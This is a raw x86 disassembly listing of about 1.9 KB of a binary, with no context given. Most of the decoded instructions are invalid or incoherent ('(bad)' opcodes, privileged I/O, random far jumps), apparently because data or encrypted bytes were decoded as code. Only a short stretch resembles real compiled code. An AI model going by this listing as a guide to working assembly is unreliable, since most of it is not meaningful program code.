  4028d0:	sub    DWORD PTR [eax],ecx
  4028d2:	out    dx,al
  4028d3:	xor    edx,0xffffffe2
  4028d6:	stc    
  4028d7:	daa    
  4028d8:	xor    eax,0x8af3019b
  4028dd:	push   esi
  4028de:	adc    ecx,ecx
  4028e0:	mov    eax,0xb6ea2bec
  4028e5:	cli    
  4028e6:	dec    esi
  4028e7:	not    edx
  4028e9:	fs jb  0x40295a
  4028ec:	std    
  4028ed:	sub    al,dh
  4028ef:	cdq    
  4028f0:	repz mov cl,0x9b
  4028f3:	push   es
  4028f4:	(bad)  
  4028f5:	jmp    0x4028b2
  4028f7:	mov    dh,0x19
  4028f9:	aas    
  4028fa:	bound  ecx,QWORD PTR [ecx]
  4028fc:	pop    ss
  4028fd:	rcl    ecx,cl
  4028ff:	enter  0xcfc4,0xac
  402903:	dec    edx
  402904:	stos   DWORD PTR es:[edi],eax
  402905:	outs   dx,DWORD PTR ds:[esi]
  402906:	popf   
  402907:	and    al,0xc2
  402909:	sub    esp,DWORD PTR [edx+0x72e83286]
  40290f:	pop    edi
  402910:	inc    esp
  402911:	sub    eax,0xed517e94
  402916:	leave  
  402917:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402918:	mov    esp,DWORD PTR [ecx+0x31]
  40291b:	or     dh,BYTE PTR [ecx+0x1e44d486]
  402921:	mov    edi,0xee5c440
  402926:	pop    ebx
  402927:	and    DWORD PTR [esi+0x32338640],0xc665a896
  402931:	out    dx,eax
  402932:	xor    ecx,DWORD PTR [ecx-0x39]
  402935:	sbb    DWORD PTR [esi],ebp
  402937:	nop
  402938:	adc    al,0x24
  40293a:	les    ecx,FWORD PTR [ebx-0x59]
  40293d:	mov    ebp,0xe5fb13b2
  402942:	jmp    0x402952
  402944:	test   DWORD PTR [ebx],esp
  402946:	push   eax
  402947:	sbb    al,0x9a
  402949:	mov    ch,0x4a
  40294b:	push   es
  40294c:	push   cs
  40294d:	jbe    0x4029cb
  40294f:	pushf  
  402950:	repz pop eax
  402952:	mov    BYTE PTR [ebp-0x457c5e51],bl
  402958:	and    BYTE PTR [ecx-0x59],bh
  40295b:	(bad)  
  40295c:	fwait
  40295d:	imul   DWORD PTR [edi+0x38]
  402960:	fcomi  st,st(6)
  402962:	test   DWORD PTR [ebx],ecx
  402964:	push   eax
  402965:	xchg   ebp,eax
  402966:	(bad)  
  402967:	xchg   edi,eax
  402968:	js     0x402975
  40296a:	mov    ch,0xc8
  40296c:	fld    QWORD PTR [esi]
  40296e:	pop    ss
  40296f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402970:	scas   eax,DWORD PTR es:[edi]
  402971:	cld    
  402972:	mov    bh,0xb
  402974:	jae    0x40293f
  402976:	push   ss
  402977:	cmp    esi,DWORD PTR [esi]
  402979:	mov    al,0x8b
  40297b:	mov    DWORD PTR [edx],ebx
  40297d:	xchg   edi,eax
  40297e:	push   ebp
  40297f:	(bad)  
  402981:	jecxz  0x4029d4
  402983:	jg     0x4029bc
  402985:	lahf   
  402986:	div    DWORD PTR [edi-0x221b3d3d]
  40298c:	pop    ebp
  40298d:	sub    al,0x92
  40298f:	lock ret 0xdcc1
  402993:	mov    ebp,0xa0a90676
  402998:	lahf   
  402999:	and    DWORD PTR cs:[ebx],ebp
  40299c:	cmp    al,0x6b
  40299e:	stc    
  40299f:	leave  
  4029a0:	mov    esp,0xac907d79
  4029a5:	ror    DWORD PTR [edx-0xf],0x2
  4029a9:	daa    
  4029aa:	inc    ebp
  4029ab:	mov    ch,0x7e
  4029ad:	sub    DWORD PTR [ecx-0x4a7d006e],edi
  4029b3:	sub    ecx,DWORD PTR [edx+0x9]
  4029b6:	jmp    0x4029ac
  4029b8:	cdq    
  4029b9:	fwait
  4029ba:	or     DWORD PTR [esi],ebx
  4029bc:	jmp    0x9801:0x8b1e20e8
  4029c3:	sub    ebx,DWORD PTR [eax+0x168a8080]
  4029c9:	(bad)  
  4029ca:	mov    WORD PTR [edx+0x50],?
  4029cd:	xor    al,bl
  4029cf:	cmp    ch,BYTE PTR [eax+0x5da4fc8]
  4029d5:	jge    0x402963
  4029d7:	add    BYTE PTR [edi],al
  4029d9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4029da:	inc    ebx
  4029db:	mov    ecx,0xf00c0413
  4029e1:	add    DWORD PTR [edi+0x4d],0x221c6a63
  4029e8:	xor    al,0x9f
  4029ea:	cmp    ecx,DWORD PTR [edi+0x20]
  4029ed:	xchg   esp,eax
  4029ee:	sub    al,0xff
  4029f0:	adc    BYTE PTR ss:[edi],al
  4029f3:	or     DWORD PTR [eax],ebx
  4029f5:	pusha  
  4029f6:	pop    edx
  4029f7:	pop    esi
  4029f8:	mov    ebp,0xe8f9ea1f
  4029fd:	push   es
  4029fe:	or     edi,DWORD PTR [eax-0x2f177c1b]
  402a04:	mov    ebx,ecx
  402a06:	loope  0x4029e3
  402a08:	inc    edi
  402a09:	jp     0x402a74
  402a0b:	mov    eax,0xac1848ec
  402a10:	das    
  402a11:	or     ch,BYTE PTR [esi]
  402a13:	cmp    DWORD PTR [ecx],eax
  402a15:	add    ecx,DWORD PTR [esi+0x13]
  402a18:	adc    eax,DWORD PTR [ecx*1-0x540a487b]
  402a1f:	or     al,0x73
  402a21:	mov    edx,0x7742ccdd
  402a26:	jmp    0xfdef:0xc6bc5204
  402a2d:	xchg   edx,eax
  402a2e:	mov    bh,0xd6
  402a30:	xor    BYTE PTR [esi],0xa6
  402a33:	mov    ds:0xa089e263,eax
  402a38:	imul   ebx,DWORD PTR [edi],0x1832033a
  402a3e:	in     eax,0xc
  402a40:	adc    cl,BYTE PTR [edx]
  402a42:	(bad)  
  402a43:	xchg   edi,eax
  402a44:	jns    0x402aa9
  402a46:	mov    al,ss:0x8ae22351
  402a4c:	push   edi
  402a4d:	out    dx,al
  402a4e:	enter  0x15db,0xc4
  402a52:	mov    edi,0x59fa9dd9
  402a57:	cli    
  402a58:	mov    ds:0x1ca0d9eb,al
  402a5d:	test   eax,0xa37a2af
  402a62:	scas   al,BYTE PTR es:[edi]
  402a63:	mov    ah,BYTE PTR [edi-0x28faed59]
  402a69:	sub    edi,DWORD PTR [esi]
  402a6b:	xchg   esp,eax
  402a6c:	dec    edi
  402a6d:	cwde   
  402a6e:	mov    bl,0xad
  402a70:	xor    cl,BYTE PTR [eax+0x25160b67]
  402a76:	rcl    DWORD PTR [eax+0x56379f98],1
  402a7c:	jnp    0x402af1
  402a7e:	push   eax
  402a7f:	dec    ebp
  402a80:	mov    al,ds:0xa55a5de6
  402a85:	adc    DWORD PTR [edx+0x74af9b6],eax
  402a8b:	push   DWORD PTR [ecx]
  402a8d:	pop    esi
  402a8e:	outs   dx,DWORD PTR ds:[esi]
  402a8f:	and    eax,DWORD PTR [ebp+0x17134437]
  402a95:	shr    DWORD PTR [ebp-0x6e15c2e4],cl
  402a9b:	push   ecx
  402a9c:	xor    bl,BYTE PTR ds:0xd3f8d4ac
  402aa2:	pop    es
  402aa3:	adc    bh,dl
  402aa5:	and    al,0x5f
  402aa7:	or     cl,bl
  402aa9:	repz out 0xed,eax
  402aac:	je     0x402b19
  402aae:	popf   
  402aaf:	pop    edi
  402ab0:	in     al,dx
  402ab1:	addr16 sbb esp,esi
  402ab4:	in     eax,dx
  402ab5:	dec    esi
  402ab6:	dec    ebx
  402ab7:	ja     0x402b1c
  402ab9:	mov    ds:0x7771308c,eax
  402abe:	(bad)  
  402abf:	neg    BYTE PTR [eax+eiz*1]
  402ac2:	inc    ecx
  402ac3:	cmp    BYTE PTR [edi],ch
  402ac5:	xchg   ebx,eax
  402ac6:	mov    esp,0xff830b9c
  402acb:	jp     0x402ac6
  402acd:	sar    al,cl
  402acf:	sub    esi,eax
  402ad1:	or     BYTE PTR [eax-0x4c5c14e1],cl
  402ad7:	das    
  402ad8:	sbb    edx,DWORD PTR [ecx-0x3]
  402adb:	outs   dx,DWORD PTR ds:[esi]
  402adc:	add    al,0x97
  402ade:	push   edx
  402adf:	retf   
  402ae0:	dec    ebp
  402ae1:	loopne 0x402b50
  402ae3:	mov    al,0x85
  402ae5:	inc    esp
  402ae6:	push   ecx
  402ae7:	loop   0x402b21
  402ae9:	cmp    eax,0xfd16f09c
  402aee:	pop    esp
  402aef:	aas    
  402af0:	pop    ecx
  402af1:	ret    0x9bda
  402af4:	jmp    0x1f3c:0x59dc83be
  402afb:	or     esp,DWORD PTR [esi]
  402afd:	iret   
  402afe:	jns    0x402a80
  402b00:	adc    BYTE PTR [edx-0x387ecf9a],0x40
  402b07:	fdivr  QWORD PTR [ecx-0x5a]
  402b0a:	ret    
  402b0b:	add    DWORD PTR [ebp-0x37d42d47],edi
  402b11:	jmp    0x402db0
  402b16:	ror    al,0xc2
  402b19:	int    0xda
  402b1b:	rcr    ebx,1
  402b1d:	aad    0x7b
  402b1f:	bound  ebp,QWORD PTR [esi+0x37]
  402b22:	mov    ch,0xb9
  402b24:	sti    
  402b25:	test   DWORD PTR [esi-0x18787ee],ecx
  402b2b:	jle    0x402ba5
  402b2d:	js     0x402aba
  402b2f:	jge    0x402b5d
  402b31:	jecxz  0x402ac3
  402b33:	fst    QWORD PTR [edi]
  402b35:	into   
  402b36:	dec    esp
  402b37:	push   edi
  402b38:	fnstenv [ecx-0x4b]
  402b3b:	pop    ebp
  402b3c:	(bad)  
  402b3d:	mov    ds:0xa9d88d2e,eax
  402b42:	mov    dl,0x94
  402b44:	or     ecx,DWORD PTR [esi-0x501be296]
  402b4a:	in     eax,dx
  402b4b:	shr    DWORD PTR [esi-0x1e1fa132],1
  402b51:	scas   eax,DWORD PTR es:[edi]
  402b52:	and    BYTE PTR [esi+0x4dc49952],al
  402b58:	jae    0x402b29
  402b5a:	call   0xe28b033e
  402b5f:	xchg   DWORD PTR [edi],eax
  402b61:	cwde   
  402b62:	clc    
  402b63:	outs   dx,BYTE PTR ds:[esi]
  402b64:	repz mov dh,0x28
  402b67:	mov    esi,0xaec4823
  402b6c:	ret    0xd28c
  402b6f:	push   0x4d
  402b71:	xchg   esp,eax
  402b72:	jle    0x402bb1
  402b74:	jae    0x402b94
  402b76:	outs   dx,DWORD PTR ds:[esi]
  402b77:	xchg   ecx,eax
  402b78:	add    bl,BYTE PTR [eax+ecx*1]
  402b7b:	mov    cl,0xa
  402b7d:	inc    esi
  402b7e:	into   
  402b7f:	or     DWORD PTR [ebp-0x20cf7f7],esi
  402b85:	neg    ebx
  402b87:	(bad)  
  402b88:	aad    0xd1
  402b8a:	push   edi
  402b8b:	pop    edx
  402b8c:	sub    eax,0x926c44e3
  402b91:	jns    0x402be7
  402b93:	fdivp  st(2),st
  402b95:	mov    ds:0x11a28233,eax
  402b9a:	gs ja  0x402ba1
  402b9d:	cmp    al,0xb6
  402b9f:	jmp    0x1925:0xa62976ba
  402ba6:	out    0x54,al
  402ba8:	cmc    
  402ba9:	sti    
  402baa:	cmp    ebx,DWORD PTR [edi-0x76]
  402bad:	dec    esp
  402bae:	fwait
  402baf:	jnp    0x402b52
  402bb1:	dec    ebp
  402bb2:	retf   0x96ed
  402bb5:	lods   eax,DWORD PTR ds:[esi]
  402bb7:	or     al,0xd2
  402bb9:	imul   edx,DWORD PTR [ecx+esi*2-0x2d],0xefdacac4
  402bc1:	dec    eax
  402bc2:	call   0xf4c1:0x1795e8cb
  402bc9:	ins    BYTE PTR es:[edi],dx
  402bca:	outs   dx,DWORD PTR ds:[esi]
  402bcb:	jmp    DWORD PTR [ecx-0x4c56e0cd]
  402bd1:	(bad)  
  402bd2:	bound  edi,QWORD PTR [ecx]
  402bd4:	jle    0x402bd4
  402bd6:	repz xchg ebx,eax
  402bd8:	add    DWORD PTR [esi+0x450c0cf4],edi
  402bde:	jo     0x402c52
  402be0:	xchg   esi,eax
  402be1:	adc    ah,BYTE PTR [esi+eiz*1]
  402be4:	xor    edx,eax
  402be6:	jg     0x402c5b
  402be8:	cmp    al,0xf4
  402bea:	neg    DWORD PTR [edx]
  402bec:	mov    al,0xe3
  402bee:	jns    0x402c62
  402bf0:	shr    BYTE PTR [edx],0x5f
  402bf3:	push   esi
  402bf4:	mov    ebx,?
  402bf6:	sar    BYTE PTR [ecx+0x2c],cl
  402bf9:	xor    al,0x8d
  402bfb:	pushf  
  402bfc:	out    0xf7,eax
  402bfe:	sar    BYTE PTR [ebx+0x40],cl
  402c01:	scas   eax,DWORD PTR es:[edi]
  402c02:	stos   BYTE PTR es:[edi],al
  402c03:	push   esp
  402c04:	add    al,0xec
  402c06:	mov    ebx,0x6234396c
  402c0b:	pop    edx
  402c0c:	lahf   
  402c0d:	push   ds
  402c0e:	cmp    BYTE PTR [ebx-0x1c],al
  402c11:	mov    ebp,0xc73eac4f
  402c16:	sbb    al,0x70
  402c18:	add    eax,0x6c20d5ec
  402c1d:	iret   
  402c1e:	adc    DWORD PTR [edx+0x75c29792],0x76facdce
  402c28:	add    eax,0xfa8cdcca
  402c2d:	shr    BYTE PTR [edi],0xbe
  402c30:	jb     0x402cae
  402c32:	test   DWORD PTR [ebx+0x60],esi
  402c35:	xchg   DWORD PTR [ebp-0x4a7584b],eax
  402c3b:	mov    dl,0xa
  402c3d:	xor    DWORD PTR [esi-0x54da71bd],esi
  402c43:	mov    dh,0xc1
  402c45:	fadd   DWORD PTR [edx+0x5ae9ac6c]
  402c4c:	add    BYTE PTR [ebx],dh
  402c4e:	je     0x402c97
  402c50:	int3   
  402c51:	retf   0x5c04
  402c54:	cmp    dh,BYTE PTR [ebx+0x5a160e42]
  402c5a:	add    BYTE PTR [edi-0x59],bh
  402c5d:	fadd   DWORD PTR [ecx]
  402c5f:	rol    DWORD PTR [ecx],1
  402c61:	pusha  
  402c62:	and    DWORD PTR [edi+0x4dd2a734],ecx
  402c68:	cli    
  402c69:	test   DWORD PTR [ecx+0x7d],edx
  402c6c:	sub    dh,cl
  402c6e:	xlat   BYTE PTR ds:[ebx]
  402c6f:	add    eax,0x9ba0dc36
  402c74:	out    dx,al
  402c75:	adc    ecx,DWORD PTR [ecx+eax*1]
  402c78:	sub    esp,ecx
  402c7a:	jb     0x402c70
  402c7c:	push   0xffffff85
  402c7e:	les    ebx,FWORD PTR [ebx-0x3d]
  402c81:	fwait
  402c82:	inc    esi
  402c83:	ficom  DWORD PTR [esp+ebp*8+0x72]
  402c87:	jle    0x402cee
  402c89:	add    al,0x36
  402c8b:	ds stc 
  402c8d:	in     eax,0xe0
  402c8f:	int    0xd7
  402c91:	(bad)  [esi+0x6a]
  402c94:	sbb    ah,cl
  402c96:	pop    ss
  402c97:	and    DWORD PTR ds:0x8acf7705,edi
  402c9d:	ss sbb eax,0x7495ec28
  402ca3:	loop   0x402c80
  402ca5:	jno    0x402cca
  402ca7:	push   0xffffffa2
  402ca9:	test   BYTE PTR [edi-0x47a5484c],0xc5
  402cb0:	das    
  402cb1:	lea    edi,[esi+0x6090cbb0]
  402cb7:	dec    eax
  402cb8:	fldcw  WORD PTR [edx]
  402cba:	push   ebp
  402cbb:	test   al,0x84
  402cbd:	sub    DWORD PTR [edi+0x52138293],esp
  402cc3:	adc    al,0x80
  402cc5:	mov    ah,0xaf
  402cc7:	mov    ebp,0xc5a1eda7
  402ccc:	sbb    BYTE PTR [ebp-0x6e1863e3],dl
  402cd2:	ret    0xa242
  402cd5:	jecxz  0x402d18
  402cd7:	cwde   
  402cd8:	sbb    edi,DWORD PTR ss:[eax]
  402cdb:	sbb    al,0x19
  402cdd:	mov    DWORD PTR [ebx+edx*4],0x2edff3b9
  402ce4:	mov    WORD PTR [ebx-0x5a],cs
  402ce7:	addps  xmm1,XMMWORD PTR [edx]
  402cea:	mov    WORD PTR [ebp+0x16],?
  402ced:	iret   
  402cee:	test   eax,0x4a990f1e
  402cf3:	(bad)  
  402cf4:	or     ebp,esp
  402cf6:	rol    DWORD PTR [esi-0x7f],cl
  402cf9:	and    al,0xcd
  402cfb:	fcom   QWORD PTR [ebx]
  402cfd:	jg     0x402cdd
  402cff:	xor    BYTE PTR [ecx],cl
  402d01:	rcr    ecx,0x47
  402d04:	shr    edi,0x91
  402d07:	sbb    edx,esi
  402d09:	cwde   
  402d0a:	adc    DWORD PTR [edi],esp
  402d0c:	mov    ch,0xd9
  402d0e:	add    bh,BYTE PTR [edx+ecx*2]
  402d11:	mov    DWORD PTR [ebp-0x2f],eax
  402d14:	cdq    
  402d15:	dec    eax
  402d16:	inc    esp
  402d17:	in     al,0x6a
  402d19:	(bad)  
  402d1a:	in     al,0x75
  402d1c:	in     al,0x73
  402d1e:	sub    esp,esi
  402d20:	jle    0x402d3f
  402d22:	lods   al,BYTE PTR ds:[esi]
  402d23:	jl     0x402cf9
  402d25:	mov    WORD PTR [esi-0x3028c036],?
  402d2b:	jns    0x402cf0
  402d2d:	arpl   dx,ax
  402d2f:	adc    cl,cl
  402d31:	dec    ebp
  402d32:	scas   eax,DWORD PTR es:[edi]
  402d33:	mul    DWORD PTR [edi+0x1c]
  402d36:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402d37:	inc    ebx
  402d38:	jecxz  0x402d00
  402d3a:	mov    bh,0x64
  402d3c:	repnz dec esi
  402d3e:	pop    esi
  402d3f:	aas    
  402d40:	(bad)  
  402d41:	jno    0x402d39
  402d43:	ins    DWORD PTR es:[edi],dx
  402d44:	pop    eax
  402d45:	xor    ch,BYTE PTR [edx]
  402d47:	push   ss
  402d48:	(bad)  
  402d49:	js     0x402d2b
  402d4b:	push   ds
  402d4c:	retf   0x754
  402d4f:	sub    BYTE PTR [edx-0x74],bl
  402d52:	sub    al,0xb8
  402d54:	and    al,0xd2
  402d56:	call   0xd48eee5e
  402d5b:	fcom   QWORD PTR [edx+0x7f037904]
  402d61:	xchg   DWORD PTR ds:0xd74b93a7,edi
  402d67:	pusha  
  402d68:	fs retf 
  402d6a:	jnp    0x402d01
  402d6c:	cmp    al,0x96
  402d6e:	mov    ds:0x1d957404,al
  402d73:	push   cs
  402d74:	jnp    0x402d02
  402d76:	js     0x402de5
  402d78:	scas   eax,DWORD PTR es:[edi]
  402d79:	pop    ebp
  402d7a:	and    BYTE PTR [ebp+0x7098c9b9],dh
  402d80:	leave  
  402d81:	lds    ebx,FWORD PTR [ebx-0x3e]
  402d84:	inc    ecx
  402d85:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402d86:	aam    0x4e
  402d88:	adc    BYTE PTR [eax-0xd],bh
  402d8b:	pop    edi
  402d8c:	scas   eax,DWORD PTR es:[edi]
  402d8d:	popf   
  402d8e:	push   ecx
  402d8f:	dec    eax
  402d90:	mov    edi,0xc2066879
  402d95:	pop    ss
  402d96:	into   
  402d97:	mov    edx,0xbaa3628c
  402d9c:	sub    BYTE PTR [edi-0x36],ah
  402d9f:	rcl    DWORD PTR [edx],0x1a
  402da2:	iret   
  402da3:	dec    edx
  402da4:	lods   al,BYTE PTR ds:[esi]
  402da5:	(bad)  
  402da6:	daa    
  402da7:	mov    bh,0x4c
  402da9:	xchg   dl,bh
  402dab:	(bad)  
  402dad:	jb     0x402dfe
  402daf:	sbb    DWORD PTR [ebx],ebp
  402db1:	iret   
  402db2:	mov    WORD PTR [ebp-0x4],cx
  402db6:	jmp    0x402dc8
  402dbb:	xor    eax,esi
  402dbd:	lea    eax,[eax+ecx*1+0x327298]
  402dc4:	mov    WORD PTR [ebp-0x4],ax
  402dc8:	mov    eax,DWORD PTR [ebp-0xc]
  402dcb:	cmp    eax,ebx
  402dcd:	je     0x403080
  402dd3:	mov    eax,DWORD PTR [ebp-0x8]
  402dd6:	mov    DWORD PTR [eax],0x60341eb0
  402ddc:	jmp    0x404380
  402de1:	jmp    0x403080
  402de6:	(bad)  
  402de7:	leave  
  402de8:	(bad)  
  402de9:	vpsubusw xmm2,xmm4,xmm5
  402ded:	leave  
  402dee:	repnz int 0x29
  402df1:	cld    
  402df2:	out    dx,eax
  402df3:	pop    edx
  402df4:	mov    dl,0x25
  402df6:	or     al,0x17
  402df8:	js     0x402e72
  402dfa:	(bad)  
  402dfb:	jle    0x402e75
  402dfd:	js     0x402e5b
  402dff:	mov    ds:0x24a0672d,al
  402e04:	fwait
  402e05:	cmp    ch,BYTE PTR [edx]
  402e07:	clc    
  402e08:	mov    esi,0x2e294f60
  402e0d:	push   ebx
  402e0e:	xor    DWORD PTR [ebx-0x52],ebp
  402e11:	xor    bh,dl
  402e13:	push   cs
  402e14:	pop    edx
  402e15:	inc    esp
  402e16:	arpl   WORD PTR [edi],dx
  402e18:	pop    edx
  402e19:	in     al,0x94
  402e1b:	daa    
  402e1c:	ss dec ebx
  402e1e:	dec    ebp
  402e1f:	adc    ecx,eax
  402e21:	mov    al,0x66
  402e23:	add    eax,0xc5a9e903
  402e28:	out    0xf9,al
  402e2a:	in     eax,dx
  402e2b:	fadd   QWORD PTR [esi+0x1]
  402e2e:	jg     0x402dd1
  402e30:	imul   esi,DWORD PTR [eax-0x5],0xd6d18c45
  402e37:	dec    edx
  402e38:	jmp    0xdac0:0xfccfd7f5
  402e3f:	fldln2 
  402e41:	cmp    esp,DWORD PTR [ebp+0x6f]
  402e44:	pop    esi
  402e45:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402e46:	repz jbe 0x402def
  402e49:	out    dx,al
  402e4a:	pop    ss
  402e4b:	fsub   QWORD PTR [ecx-0x4e]
  402e4e:	xchg   ebx,eax
  402e4f:	push   eax
  402e50:	mov    eax,0x965a9115
  402e55:	mov    al,0x6b
  402e57:	add    DWORD PTR [ecx+0x7e],ebx
  402e5a:	out    0x5d,eax
  402e5c:	ins    BYTE PTR es:[edi],dx
  402e5d:	nop
  402e5e:	jb     0x402e0a
  402e60:	push   esi
  402e61:	into   
  402e62:	xchg   BYTE PTR [esp+esi*2],cl
  402e65:	hlt    
  402e66:	pop    ebx
  402e67:	xchg   edi,eax
  402e68:	gs repnz mov cl,0x4d
  402e6c:	add    DWORD PTR [ebx+0x69ac7f7f],ebx
  402e72:	xor    edx,DWORD PTR [ebx-0x31cae882]
  402e78:	in     al,0xaa
  402e7a:	mov    DWORD PTR [ebx+edi*4-0x73],edi
  402e7e:	xchg   ebp,eax
  402e7f:	test   eax,0x7addb34d
  402e84:	and    BYTE PTR [ebx+0x18fd541a],ch
  402e8a:	fcomp  DWORD PTR ds:0xc1691f86
  402e90:	stos   DWORD PTR es:[edi],eax
  402e91:	das    
  402e92:	stos   BYTE PTR es:[edi],al
  402e93:	dec    bh
  402e95:	cmp    dl,BYTE PTR [ebx]
  402e97:	cld    
  402e98:	loope  0x402eb3
  402e9a:	(bad)  
  402e9b:	mov    dl,0xf7
  402e9d:	sbb    BYTE PTR [edx+0x67a2affd],bl
  402ea3:	xchg   ebp,eax
  402ea4:	or     eax,0x191ba250
  402ea9:	lods   al,BYTE PTR ds:[esi]
  402eaa:	add    al,0x35
  402eac:	mov    esi,0x44b4b689
  402eb1:	xchg   esi,eax
  402eb2:	ja     0x402ef3
  402eb4:	adc    BYTE PTR [ebx-0x7f],dl
  402eb7:	or     BYTE PTR [edi+0x68],al
  402eba:	test   eax,0x815b263b
  402ebf:	mov    cl,0x41
  402ec1:	sub    ah,0xde
  402ec4:	(bad)  [esp+esi*2+0x32d8ef34]
  402ecb:	loope  0x402e87
  402ecd:	push   ecx
  402ece:	(bad)
  402ed1:	(bad)  
  402ed2:	jmp    0x402ecd
  402ed4:	and    al,0xaa
  402ed6:	sahf   
  402ed7:	mov    eax,ds:0x15d8a974
  402edc:	adc    al,0x55
  402ede:	xchg   esi,ebp
  402ee0:	xchg   edx,eax
  402ee1:	dec    ecx
  402ee2:	call   0xcd66:0x9f70f3f7
  402ee9:	pop    ebx
  402eea:	sub    al,BYTE PTR cs:[ebx+0x73]
  402eee:	loope  0x402f0d
  402ef0:	xor    eax,0x51f95a9
  402ef5:	pusha  
  402ef6:	sbb    BYTE PTR [eax+eax*1-0x35b27008],bh
  402efd:	adc    DWORD PTR [ebp-0x254aa67c],0x2b
  402f04:	sub    eax,0x31a0640b
  402f09:	adc    ebx,ebx
  402f0b:	jmp    0x402ec3
  402f0d:	mov    eax,ds:0x72a87bf2
  402f12:	fcomi  st,st(5)
  402f14:	clc    
  402f15:	sbb    BYTE PTR [esi+ebx*4+0x2e],0xd0
  402f1a:	cmp    ebp,DWORD PTR [edx-0x45]
  402f1d:	scas   al,BYTE PTR es:[edi]
  402f1e:	shl    DWORD PTR [ecx+0x40],1
  402f21:	dec    ebp
  402f22:	push   ds
  402f23:	dec    eax
  402f24:	jo     0x402f0a
  402f26:	daa    
  402f27:	and    DWORD PTR [esi+0x54d944d9],ebp
  402f2d:	inc    ebp
  402f2e:	jmp    0x402f00
  402f30:	xor    BYTE PTR [si-0x6a],al
  402f34:	sub    DWORD PTR [ebp+0x6b],ebx
  402f37:	mov    BYTE PTR [esi+0x9],0x5a
  402f3b:	mov    ch,0x3a
  402f3d:	js     0x402f65
  402f3f:	xchg   ebp,eax
  402f40:	out    0xe8,al
  402f42:	or     BYTE PTR [eax-0x3e],bl
  402f45:	lods   al,BYTE PTR ds:[esi]
  402f46:	(bad)
  402f49:	jnp    0x402f72
  402f4b:	mov    bh,0xd6
  402f4d:	(bad)  
  402f4e:	(bad)  
  402f4f:	mov    cl,0xeb
  402f51:	inc    esp
  402f52:	fiadd  WORD PTR [ebx-0x48a2aaf3]
  402f58:	jecxz  0x402f2c
  402f5a:	sub    bl,BYTE PTR [ebp+0x1b2fea27]
  402f60:	mov    esp,0xba9d13d6
  402f65:	adc    DWORD PTR [ebp-0x74],eax
  402f68:	jb     0x402f0a
  402f6a:	popf   
  402f6b:	repnz sub ch,BYTE PTR [ebx]
  402f6e:	fcomp  DWORD PTR [eax-0x43]
  402f71:	or     al,0x2b
  402f73:	jns    0x402fbd
  402f75:	add    eax,0xdf136390
  402f7a:	jmp    0x402f39
  402f7c:	inc    ebp
  402f7d:	stos   BYTE PTR es:[edi],al
  402f7e:	aaa    
  402f7f:	pop    edx
  402f80:	mov    edx,esi
  402f82:	inc    edx
  402f83:	sahf   
  402f84:	sbb    BYTE PTR ds:[esi+0x34],ch
  402f88:	(bad)  
  402f89:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402f8a:	jg     0x402f47
  402f8c:	cs mov dl,0x3d
  402f8f:	inc    edx
  402f90:	dec    edx
  402f91:	sti    
  402f92:	fcmove st,st(4)
  402f94:	in     eax,0x35
  402f96:	test   DWORD PTR [esi+0x50],ebx
  402f99:	xor    ch,bh
  402f9b:	push   ds
  402f9c:	mov    dl,ch
  402f9e:	or     edi,ebx
  402fa0:	inc    esp
  402fa1:	nop
  402fa2:	ja     0x402fa9
  402fa4:	(bad)  
  402fa5:	ja     0x402fe6
  402fa7:	dec    ebx
  402fa8:	(bad)  
  402fa9:	or     BYTE PTR [bx+di-0x42d6],bl
  402fae:	fwait
  402faf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402fb0:	repz jle 0x402fb1
  402fb3:	dec    esi
  402fb4:	and    eax,0x493d87ce
  402fb9:	xchg   edx,eax
  402fba:	js     0x402f86
  402fbc:	leave  
  402fbd:	(bad)  
  402fbe:	aam    0x26
  402fc0:	retf   0x2b21
  402fc3:	dec    edx
  402fc4:	pop    ecx
  402fc5:	call   0xe59d63e0
  402fca:	(bad)  
  402fcb:	dec    cl
  402fcd:	xor    ch,dh
  402fcf:	adc    edi,DWORD PTR [edi+edx*8]
  402fd2:	aas    
  402fd3:	jmp    0x97cd2ad5
  402fd8:	xor    BYTE PTR [edi-0x3a],0xb4
  402fdc:	inc    esi
  402fdd:	mov    al,0xb0
  402fdf:	fld    DWORD PTR [ebx]
  402fe1:	adc    eax,0xf1af1930
  402fe6:	sub    DWORD PTR [esi-0x5719df80],ebx
  402fec:	jno    0x402fd8
  402fee:	and    eax,0x9fcde824
  402ff3:	nop
  402ff4:	adc    al,cl
  402ff6:	push   ebx
  402ff7:	adc    dl,bh
  402ff9:	mov    ch,0xba
  402ffb:	dec    ebx
  402ffc:	dec    edi
  402ffd:	ret    
  402ffe:	vmread eax,esp
  403001:	pop    esp
  403002:	call   0x38e814d0
  403007:	cmc    
  403008:	shl    esp,1
  40300a:	shl    DWORD PTR [ebp-0x72],1
  40300d:	sub    BYTE PTR [eax+0xb],0xa4
  403011:	xchg   edi,eax
  403012:	aad    0x76
  403014:	add    eax,0xde79542e
  403019:	pushf  
  40301a:	lods   eax,DWORD PTR ds:[esi]
  40301b:	xchg   esp,eax
  40301c:	das    
  40301d:	cli    
  40301e:	fisub  WORD PTR [edx-0x42]
  403021:	cmp    eax,0xcfd5bb90
  403026:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403027:	jmp    0x2ebdd404
  40302c:	push   edi
  40302d:	(bad)  
  40302e:	cs push esi
  403030:	mov    eax,ds:0x71f8f478
  403035:	xchg   esp,eax
  403036:	mov    dh,0xc7
  403038:	cld    
  403039:	out    0x85,eax
  40303b:	rcr    DWORD PTR [edi],0x4f
  40303e:	mov    al,0xff
  403040:	push   edx
  403041:	cmc    
  403042:	xchg   ebp,eax
  403043:	loop   0x403028
  403045:	mov    cs,WORD PTR [ecx-0x18d6d179]
  40304b:	(bad)  
  40304c:	mov    ecx,0x65892a09
  403051:	clc    
  403052:	scas   eax,DWORD PTR es:[edi]
  403053:	and    ah,BYTE PTR [edi-0x11]
  403056:	xchg   si,ax
  403058:	cli    
  403059:	addr16 push 0x7594ebb
  40305f:	fwait
  403060:	popf   
  403061:	aas    
  403062:	mov    BYTE PTR [eax-0x6f78cfc5],dh
  403068:	sahf   
  403069:	inc    esp
  40306a:	pop    es
  40306b:	sbb    al,0x53
  40306d:	pop    ebp
  40306e:	add    eax,0x4335fc7c
  403073:	dec    eax
